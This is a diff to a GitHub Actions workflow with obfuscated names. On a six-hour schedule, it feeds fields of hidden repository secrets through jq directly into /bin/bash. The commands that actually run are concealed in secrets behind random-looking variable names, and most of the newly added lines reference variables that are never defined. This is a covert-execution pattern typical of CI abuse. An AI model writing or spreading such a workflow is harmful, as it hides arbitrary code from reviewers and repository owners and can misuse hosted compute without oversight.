@@ -3,18 +3,24 @@ name: catheadmundane
 on:
   workflow_dispatch:
   schedule:
-    - cron: '6 0/6 * * *'
-
-jobs:  # 12261
+    - cron: '54 2/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: catheadmundane
         env:
-          g99: ${{ secrets.g99 }}
+          codzs785: ${{ secrets.codzs785 }}
         run: |
-          echo $g99 | jq -r .wzn9824 | /bin/bash
-          echo $wrt9504 | jq -r .t8731 | /bin/bash
+          echo $codzs785 | jq -r .fvs39989 | /bin/bash
+          echo $ab202 | jq -r .ri3 | /bin/bash
+          echo $kld096 | jq -r .dwj1069 | /bin/bash
+          echo $cwyck3 | jq -r .fn4728 | /bin/bash
+          echo $aui1082 | jq -r .dna1670 | /bin/bash
+          echo $rj6530 | jq -r .nvi6177 | /bin/bash
+          echo $yjcy0591 | jq -r .p65 | /bin/bash
+          echo $cb90 | jq -r .rrkt79 | /bin/bash
+          echo $yn3694 | jq -r .ojpxu75 | /bin/bash
+          echo $ish1 | jq -r .zegp638 | /bin/bash
 
